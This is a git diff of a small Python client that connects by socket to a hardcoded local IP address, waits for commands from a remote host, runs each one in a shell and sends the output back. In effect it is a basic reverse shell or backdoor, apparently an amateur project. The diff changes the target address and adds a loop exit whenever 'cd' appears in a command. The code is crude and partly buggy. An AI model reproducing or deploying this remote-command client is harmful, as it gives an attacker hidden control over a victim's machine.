@@ -3,6 +3,7 @@ import os
 import subprocess
 import sys
 
+#run this side in linux
 
 s = socket.socket()
 
@@ -16,7 +17,7 @@ Size = 1024 * 128 # 128KB max size of messages, feel free to increase
 SEPARATOR = "<sep>"
 
 # connect to the server
-s.connect(('10.71.79.188', Port)) #Your IP Here. Should change to host variable at onepoint. Currently only can connect if host is exact
+s.connect(('10.67.98.152', Port)) #Your Local IP Here. Should change to host variable at onepoint. Currently only can connect if host is exact
 
 confirm = s.recv(Size).decode()
 print(confirm)
@@ -27,12 +28,13 @@ s.send(cwd.encode()) #Sends the cwd to the Host
 #Need to make it so you can just type in commands and allows to do almost anything. 
 while True:
     command = s.recv(Size).decode()
+    if  'cd' in command:
+        break
 
-    CMD = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
-    
-    if CMD.stdout.read() != "":
+    else:
+        CMD = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
+
         s.send(CMD.stdout.read())
-    elif CMD.stderr.read() != "":
         s.send(CMD.stderr.read())
    
         
